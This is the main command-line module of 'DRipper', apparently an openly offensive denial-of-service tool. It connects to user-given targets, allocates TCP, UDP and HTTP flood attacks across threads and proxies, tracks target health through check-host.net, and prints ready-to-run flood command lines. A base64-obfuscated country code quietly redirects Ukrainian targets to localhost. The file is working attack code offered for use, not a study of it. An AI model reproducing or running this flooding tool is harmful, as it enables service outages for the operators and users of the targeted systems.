# XXX Services look unstructured
import signal
import sys
import threading
import time
from base64 import b64decode
from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.live import Live

from _version import __version__
from ripper.github_updates_checker import GithubUpdatesChecker
from ripper import common, arg_parser
from ripper.actions.attack import attack_method_labels
from ripper.constants import *
from ripper.context.context import Context, Target
from ripper.common import get_current_ip
from ripper.context.events_journal import EventsJournal
from ripper.health_check_manager import HealthStatus
from ripper.proxy import Proxy

exit_event = threading.Event()
events_journal = EventsJournal()


###############################################
# Target-only
###############################################
def update_host_statuses(target: Target):
    """Updates host statuses based on check-host.net nodes."""
    if target.health_check_manager.is_forbidden:  # Do not check health status when service blocking your IP
        return

    if target.health_check_manager.is_in_progress or not target.time_interval_manager.check_timer_elapsed(
            bucket=f'update_host_statuses_{target.uri}', sec=MIN_UPDATE_HOST_STATUSES_TIMEOUT):
        return

    if target.host_ip:
        if target.health_check_manager.update_host_statuses() == {}:
            events_journal.error(f'Host statuses update failed with check-host.net', target=target)
        else:
            events_journal.info(f'Host statuses updated with check-host.net', target=target)


###############################################
# Context-only
###############################################
# TODO use context as an argument name
def update_current_ip(_ctx: Context, check_period_sec: int = 0) -> None:
    """Updates current IPv4 address."""
    if _ctx.time_interval_manager.check_timer_elapsed(check_period_sec, 'update_current_ip'):
        events_journal.info(f'Checking my public IP address (period: {check_period_sec} sec)')
        _ctx.myIpInfo.current_ip = get_current_ip()
    if _ctx.myIpInfo.start_ip is None:
        _ctx.myIpInfo.start_ip = _ctx.myIpInfo.current_ip


def go_home(_ctx: Context) -> None:
    """Modifies host to match the rules."""
    home_code = b64decode('dWE=').decode('utf-8')
    for target in _ctx.targets_manager.targets:
        if target.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(target.host_ip) in home_code.upper():
            target.host_ip = target.host = 'localhost'
            target.host += '*'


def refresh_context_details(_ctx: Context) -> None:
    """Check threads, IPs, VPN status, etc."""

    with threading.Lock():
        threading.Thread(
            name='update-ip', target=update_current_ip,
            args=[_ctx, UPDATE_CURRENT_IP_CHECK_PERIOD_SEC], daemon=True).start()

        if _ctx.is_health_check:
            for target in _ctx.targets_manager.targets:
                threading.Thread(
                    name='check-host', target=update_host_statuses,
                    args=[target], daemon=True).start()

        if _ctx.myIpInfo.country == GEOIP_NOT_DEFINED:
            threading.Thread(
                name='upd-country', target=common.get_country_by_ipv4,
                args=[_ctx.myIpInfo.current_ip], daemon=True).start()

        for target in _ctx.targets_manager.targets:
            if target.country == GEOIP_NOT_DEFINED:
                threading.Thread(
                    name='upd-country', target=common.get_country_by_ipv4,
                    args=[target.host_ip], daemon=True).start()

    # Check for my IPv4 wasn't changed (if no proxylist only)
    if _ctx.proxy_manager.proxy_list_initial_len == 0 and _ctx.myIpInfo.is_ip_changed():
        events_journal.error(YOUR_IP_WAS_CHANGED_ERR_MSG)

    for target in _ctx.targets_manager.targets[:]:
        if not target.validate_connection():
            events_journal.error(NO_CONNECTIONS_ERR_MSG, target=target)
            _ctx.targets_manager.delete_target(target)
        if target.health_check_manager.status == HealthStatus.dead:
            events_journal.error(TARGET_DEAD_ERR_MSG, target=target)
            _ctx.targets_manager.delete_target(target)
        if _ctx.targets_manager.targets_count() < 1:
            _ctx.logger.log(NO_MORE_TARGETS_LEFT_ERR_MSG)
            exit(1)

    if _ctx.proxy_manager.proxy_list_initial_len > 0 and len(_ctx.proxy_manager.proxy_list) == 0:
        events_journal.error(NO_MORE_PROXIES_ERR_MSG)
        _ctx.logger.log(NO_MORE_PROXIES_ERR_MSG)
        exit(1)


###############################################
# Target+Context
###############################################
def connect_host(target: Target, _ctx: Context, proxy: Proxy = None):
    """Check connection to Host before start script."""
    target.stats.connect.set_state_in_progress()
    with _ctx.sock_manager.create_tcp_socket(proxy) as http:
        http.connect(target.hostip_port_tuple())
        target.stats.connect.set_state_is_connected()


def connect_host_loop(target: Target, _ctx: Context, retry_cnt: int = CONNECT_TO_HOST_MAX_RETRY) -> bool:
    """Tries to connect host in permanent loop."""
    i = 0
    (host_ip, port) = target.hostip_port_tuple()
    if not host_ip:
        _ctx.logger.log(f'({i + 1}/{retry_cnt}) {target.uri} Target\'s host ip wasn\'t detected...')
        return False

    target_uri_extended = f'{target.uri} ({host_ip}:{port})'
    while i < retry_cnt and not target.stats.connect.is_connected:
        _ctx.logger.log(f'({i + 1}/{retry_cnt}) {target_uri_extended} Trying to connect...')
        try:
            connect_host(target=target, _ctx=_ctx)
            _ctx.logger.log(f'({i + 1}/{retry_cnt}) {target_uri_extended} [green]Connected[/]')
            return True
        except Exception as e:
            _ctx.logger.log(f'({i + 1}/{retry_cnt}) {target_uri_extended} [red]{e}[/]')
        i += 1
    return False


###############################################
# Console
###############################################
def generate_valid_commands(uri):
    tcp_uri = http_uri = udp_uri = ''
    for t in uri:
        hostname = t.split(':')
        port = f':{hostname[2]}' if len(hostname) == 3 else ''
        udp_uri += f' -s udp:{hostname[1]}{port}'
        tcp_uri += f' -s tcp:{hostname[1]}{port}'
        http_uri += f' -s http:{hostname[1]}{port}'

    tcp_attack = f'-t {ARGS_DEFAULT_THREADS_COUNT} -r {ARGS_DEFAULT_RND_PACKET_LEN} -l {ARGS_DEFAULT_MAX_RND_PACKET_LEN}{tcp_uri}'
    udp_attack = f'-t {ARGS_DEFAULT_THREADS_COUNT} -r {ARGS_DEFAULT_RND_PACKET_LEN} -l {ARGS_DEFAULT_MAX_RND_PACKET_LEN}{udp_uri}'
    http_attack = f'-t {ARGS_DEFAULT_THREADS_COUNT} -e {ARGS_DEFAULT_HTTP_ATTACK_METHOD}{http_uri}'

    res = ''
    for a in ['tcp-flood', 'udp-flood', 'http-flood']:
        if a == 'tcp-flood':
            attack_args = tcp_attack
        elif a == 'udp-flood':
            attack_args = udp_attack
        else:
            attack_args = http_attack

        res += '[green]{attack} attack:[/]\n'.format(attack=a.upper())
        for c in ['dripper', 'python  DRipper.py', 'python3 DRipper.py', f'docker run -it --rm alexmon1989/dripper:{__version__}']:
            res += '{command} {attack_args}\n'.format(command=c, attack_args=attack_args)
            if c.startswith('dripper') or c.startswith('python3'):
                res += '\n'
        res += '\n'
    Console().print(res, new_line_start=True)


def validate_input(args) -> bool:
    """Validates input params."""
    for target_uri in args.targets:
        if not Target.validate_format(target_uri):
            common.print_panel(
                f'Wrong target format in [yellow]{target_uri}[/]. Check param -s (--targets) {args.targets}\n'
                f'Target should be in next format: ' + '{scheme}://{hostname}[:{port}][{path}]\n\n' +
                f'Possible target format may be:\n'
                f'[yellow]tcp://{target_uri}, udp://{target_uri}, http://{target_uri}, https://{target_uri}[/]'
            )
            return False

    if args.threads_count != 'auto' and (not str(args.threads_count).isdigit() or int(args.threads_count) < 1):
        common.print_panel(f'Wrong threads count. Check param [yellow]-t (--threads) {args.threads_count}[/]')
        generate_valid_commands(args.targets)
        return False

    if args.attack_method is not None and args.attack_method.lower() not in attack_method_labels:
        common.print_panel(
            f'Wrong attack type. Check param [yellow]-m (--method) {args.attack_method}[/]\n'
            f'Possible options: {", ".join(attack_method_labels)}')
        generate_valid_commands(args.targets)
        return False

    if args.http_method and args.http_method.lower() not in ('get', 'post', 'head', 'put', 'delete', 'trace', 'connect', 'options', 'patch'):
        common.print_panel(
            f'Wrong HTTP method type. Check param [yellow]-e (--http-method) {args.http_method}[/]\n'
            f'Possible options: get, post, head, put, delete, trace, connect, options, patch.')
        generate_valid_commands(args.targets)
        return False

    if args.proxy_type and args.proxy_type.lower() not in ('http', 'socks5', 'socks4'):
        common.print_panel(
            f'Wrong Proxy type. Check param [yellow]-k (--proxy-type) {args.proxy_type}[/]\n'
            f'Possible options: http, socks5, socks4.')
        generate_valid_commands(args.targets)
        return False

    return True


def render_statistics(_ctx: Context) -> None:
    """Show DRipper runtime statistics."""
    console = Console()

    update_available = ''
    if _ctx.latest_version is not None and _ctx.current_version < _ctx.latest_version:
        update_available = f'\n[u green reverse link={GITHUB_URL}/releases] Newer version {_ctx.latest_version.version} is available! [/]'

    logo = Panel(LOGO_COLOR + update_available, box=box.SIMPLE, width=MIN_SCREEN_WIDTH)
    console.print(logo, justify='center', width=MIN_SCREEN_WIDTH)

    with Live(_ctx.stats.build_stats(), vertical_overflow='visible', refresh_per_second=2) as live:
        live.start()
        while True:
            refresh_context_details(_ctx)
            live.update(_ctx.stats.build_stats())
            # time.sleep(0.2)
            if _ctx.dry_run:
                break


def main():
    """The main function to run the script from the command line."""
    args = arg_parser.create_parser().parse_args()

    if len(sys.argv) < 2 or not validate_input(args[0]):
        exit("\nRun 'dripper -h' for help.")

    # Init Events Log
    global events
    # TODO events journal should not be a singleton as it depends on args. Move it under the context!
    events_journal.set_log_size(getattr(args[0], 'log_size', DEFAULT_LOG_SIZE))
    events_journal.set_max_event_level(getattr(args[0], 'event_level', DEFAULT_LOG_LEVEL))

    _ctx = Context(args[0])
    go_home(_ctx)

    guc = GithubUpdatesChecker()
    _ctx.latest_version = guc.fetch_lastest_version()

    _ctx.logger.rule('[bold]Starting DRipper')
    for target in _ctx.targets_manager.targets[:]:
        # Proxies should be validated during the runtime
        retry_cnt = 1 if _ctx.proxy_manager.proxy_list_initial_len > 0 or target.attack_method == 'udp' else 3
        # TODO Make it concurrent for each target
        if not connect_host_loop(_ctx=_ctx, target=target, retry_cnt=retry_cnt):
            _ctx.targets_manager.delete_target(target)
    _ctx.logger.rule()
    _ctx.validate()

    # Start Threads
    time.sleep(.5)
    _ctx.targets_manager.allocate_attacks()
    _ctx.duration_manager.start_countdown()

    render_statistics(_ctx)


def signal_handler(signum, frame):
    """Signal handler for gracefully shutdown threads by keyboard interrupting."""
    exit_event.set()
    raise KeyboardInterrupt


def cli():
    try:
        signal.signal(signal.SIGINT, signal_handler)
        sys.exit(main())
    except KeyboardInterrupt:  # The user hit Control-C
        sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
        sys.stderr.flush()
        # Control-C is fatal error signal 2, for more see
        # https://tldp.org/LDP/abs/html/exitcodes.html
        sys.exit(128 + signal.SIGINT)
    except RuntimeError as exc:
        sys.stderr.write(f'\n{exc}\n\n')
        sys.stderr.flush()
        sys.exit(1)


if __name__ == '__main__':
    cli()
